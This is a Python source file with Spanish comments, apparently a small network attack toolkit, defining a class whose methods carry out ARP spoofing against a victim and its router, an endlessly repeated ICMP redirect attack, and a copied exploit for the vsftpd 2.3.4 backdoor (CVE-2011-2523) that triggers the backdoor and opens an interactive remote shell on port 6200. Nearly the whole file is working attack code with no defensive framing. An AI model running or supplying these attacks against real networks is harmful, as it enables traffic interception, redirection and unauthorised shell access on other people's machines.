import scapy.all as scapy
import time
from telnetlib import Telnet 
from signal import signal, SIGINT
from sys import exit

class Ataques:


    def ArpSpoofing(self, ip_victima):

        print("Se utiliza por defecto la interfaz eth0")
        cambio_eth = input("¿Desea cambiar la interfaz? (s/n): ")
        if cambio_eth == "s":
            eth = input("Introduzca la interfaz: ")
            # Comprobamos que la interfaz existe
            if scapy.get_if_hwaddr(eth) == None:
                print("La interfaz no existe")
                return  # Salimos de la funcion
        else:
            eth = "eth0"

        # Para este ataque necesitamos 3 cosas:
        # 1. La ip de la victima (Nos la pasan por parametro)
        # 2. La ip del router (La obtenemos mediante la ip pasada por parametro)
        # 3. La mac de la victima (La obtenemos con scapy mediante la ip de la victima pasada por parametro)
        # 4. La mac del router (La obtenemos con scapy mediante la ip del router obtenida en el paso 2)
        # 5. La mac de nuestra interfaz (La obtenemos con scapy)
        
        # Tenemos que hacer creer al router que somos la victima
        # Y a la victima que somos el router

        # Paso 2:
        ip_router = ip_victima.split(".")
        ip_router = ip_router[0] + "." + ip_router[1] + "." + ip_router[2] + ".1"

        # Paso 3:
        mac_victima = scapy.getmacbyip(str(ip_victima))

        # Paso 4:
        mac_router = scapy.getmacbyip(str(ip_router))

        # Paso 5:
        mac_eth = scapy.get_if_hwaddr(eth)

        print("La mac de la victima es: " + mac_victima)
        print("La mac del router es: " + mac_router)
        print("La mac de nuestra interfaz es: " + mac_eth)

        # Con esto ya tenemos todo lo necesario para realizar el ataque

        # Debemos enviar un paquete ARP al router diciendo que somos la victima
        # Y un paquete ARP a la victima diciendo que somos el router

       # Creamos un paquete ARP con destino la ip y mac de la victima y origen ip del router y mac de nuestra interfaz
        paquete_victima = scapy.ARP(op=2, pdst=ip_victima, hwdst=mac_victima, psrc=ip_router)
        # Creamos un paquete ARP con destino la ip y mac del router y origen ip de la victima y mac de nuestra interfaz
        paquete_router = scapy.ARP(op=2, pdst=ip_router, hwdst=mac_router, psrc=ip_victima)

        # Ahora tenemos que enviar los paquetes ARP cada cierto tiempo al router y a la victima
        # Para ello creamos un bucle infinito que envie los paquetes cada 2 segundos
        # Hacemos un try except para que si el usuario pulsa ctrl+c se salga del bucle
        print("Desea comenzar el ataque? (s/n): ")
        if input() == "s":
            print("Comenzando ataque...\n Pulsa ctrl+c para salir")
            try:
                while True:
                    print(".")
                    scapy.send(paquete_victima, verbose=False)
                    scapy.send(paquete_router, verbose=False)
                    time.sleep(2)
            except KeyboardInterrupt:
                print("Se ha interrumpido el ataque")
                return
        else:
            print("Se ha cancelado el ataque")
            return

        


############################################################################################
    # Ataque IcmpRedirect con scapy
    def IcmpRedirect(self, ip):
        
        print("Se utiliza por defecto la interfaz eth0")
        cambio_eth = input("¿Desea cambiar la interfaz? (s/n): ")
        if cambio_eth == "s":
            eth = input("Introduzca la interfaz: ")
            # Comprobamos que la interfaz existe
            if scapy.get_if_hwaddr(eth) == None:
                print("La interfaz no existe")
                return  # Salimos de la funcion
        else:
            eth = "eth0"

        # Cogemos la ip del anfitrion con scapy
        ip_anfitrion = scapy.get_if_addr(eth)

        # Utilizamos la x.x.x.1 como ip src para esto cogemos la ip pasada por parametro y le quitamos el ultimo octeto
        ip_src = ip.split(".")
        ip_src = ip_src[0] + "." + ip_src[1] + "." + ip_src[2] + ".1"

        # Creamos un paquete ICMP con la ip src y dst
        ip = scapy.IP(src=ip_src, dst=ip)
        # Creamos un paquete ICMP con el tipo 5 y el codigo 1
        icmp = scapy.ICMP(type=5, code=1)
        # Creamos un paquete ICMP con la ip del anfitrion
        ip2 = scapy.IP(src=ip_anfitrion, dst="8.8.8.8")
        # Creamos un paquete ICMP con el tipo 8 y el codigo 0
        # icmp2 = scapy.ICMP(type=8, code=0)
        
        paquete = ip/icmp/ip2/scapy.ICMP()
        # Preguntamos al usuario si quiere enviar el paquete
        print("Va a comenzar el ataque:")
        enviar = input("¿Desea realizarlo? (s/n): ")
        if enviar == "s":
            # Preguntamos cuanto tiempo quiere que dure el ataque
            # tiempo = input("Introduzca el tiempo en segundos: ")

            print("\nRealizando ataque...\nPresione Ctrl+C para salir y terminar el ataque") 
            # loop infinito
            scapy.send(paquete, loop=1, inter=1)
            # scapy.send(ip/icmp/ip2/icmp2, loop=1, inter=0.5, count=int(tiempo), verbose=False)
            
            print("Ataque finalizado")
        else:
            print("Ataque cancelado")
            return  # Salimos de la funcion

    
        

    def exploit_vsftpd(self, ip):
        # Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
        # Date: 9-04-2021
        # Exploit Author: HerculesRD
        # Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html
        # Version: vsftpd 2.3.4
        # Tested on: debian
        # CVE : CVE-2011-2523

    #!/usr/bin/python3   
        

        try:
            def handler(signal_received, frame):
                # Handle any cleanup here
                # print('   [+]Exiting...')
                exit(0)

            signal(SIGINT, handler)                           
                                
            portFTP = 21 

            user="USER nergal:)"
            password="PASS pass"

            tn=Telnet(ip, portFTP)
            tn.read_until(b"(vsFTPd 2.3.4)")
            tn.write(user.encode('ascii') + b"\n")
            tn.read_until(b"password.") 
            tn.write(password.encode('ascii') + b"\n")

            tn2=Telnet(ip, 6200)
            print('Success, shell opened')
            print('Send `exit` to quit shell')
            tn2.interact()
            tn.close()
            tn2.close()
        except:
            print('   [+]Error de conexion FTP server')
            print('   [+]Saliendo...')
            return

        
            




